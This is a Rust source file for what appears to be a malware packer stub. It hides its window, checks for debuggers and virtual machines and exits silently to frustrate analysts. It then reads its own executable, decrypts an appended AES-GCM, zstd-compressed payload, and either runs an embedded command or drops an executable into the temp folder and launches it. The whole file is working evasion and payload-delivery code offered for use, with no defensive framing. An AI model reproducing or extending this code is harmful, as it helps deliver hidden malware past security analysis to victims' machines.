#![windows_subsystem = "windows"]
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use std::fs;
use std::io::Read;
use std::path::PathBuf;
use std::process::Command;

const MARKER: &[u8] = b"RSPKv1\0"; // 8 bytes

fn main() {
    let skip_anti = std::env::var("RS_PACK_SKIP_ANTI").ok().as_deref() == Some("1");
    if !skip_anti && (anti::anti_debug_triggered() || anti::anti_vm_triggered()) {
        eprintln!("anti triggered");
        // Exit silently to reduce analyst feedback
        std::process::exit(1);
    }

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    let mut buf = Vec::new();
    if fs::File::open(&exe_path)
        .and_then(|mut f| f.read_to_end(&mut buf))
        .is_err()
    {
        eprintln!("read self failed");
        return;
    }
    let pos = buf.windows(MARKER.len()).rposition(|w| w == MARKER);
    let Some(mut off) = pos.map(|p| p + MARKER.len()) else {
        eprintln!("no payload");
        return;
    };
    if off + 4 > buf.len() {
        eprintln!("fmt keylen fail");
        return;
    }
    let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if key_len != 32 {
        eprintln!("keylen invalid");
        return;
    }
    if off + key_len > buf.len() {
        eprintln!("fmt key fail");
        return;
    }
    let key = &buf[off..off + key_len];
    off += key_len;
    if off + 4 > buf.len() {
        eprintln!("fmt noncelen fail");
        return;
    }
    let nonce_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if nonce_len != 12 {
        eprintln!("noncelen invalid");
        return;
    }
    if off + nonce_len > buf.len() {
        eprintln!("fmt nonce fail");
        return;
    }
    let nonce_bytes = &buf[off..off + nonce_len];
    off += nonce_len;
    if off + 8 > buf.len() {
        eprintln!("fmt ctlen fail");
        return;
    }
    let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
    off += 8;
    if off + ct_len > buf.len() {
        eprintln!("fmt ct fail");
        return;
    }
    let ciphertext = &buf[off..off + ct_len];

    // AES-256-GCM 解密
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => {
            eprintln!("cipher init fail");
            return;
        }
    };
    let nonce = Nonce::from_slice(nonce_bytes);
    let decrypted = match cipher.decrypt(nonce, ciphertext) {
        Ok(p) => p,
        Err(_) => {
            eprintln!("decrypt fail");
            return;
        }
    };

    let payload = match zstd::decode_all(&decrypted[..]) {
        Ok(p) => p,
        Err(_) => {
            eprintln!("decompress fail");
            return;
        }
    };

    if payload.starts_with(b"CMD\0") {
        let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
        let _ = Command::new(cmd).spawn();
        return;
    }
    if payload.starts_with(b"MZ") {
        let mut out_path: PathBuf = std::env::temp_dir();
        out_path.push(format!("rs_pack_payload_{}.exe", std::process::id()));
        if fs::write(&out_path, &payload).is_ok() {
            eprintln!("spawn payload: {}", out_path.display());
            let _ = Command::new(&out_path).spawn();
        } else {
            eprintln!("write temp failed");
        }
    }
}
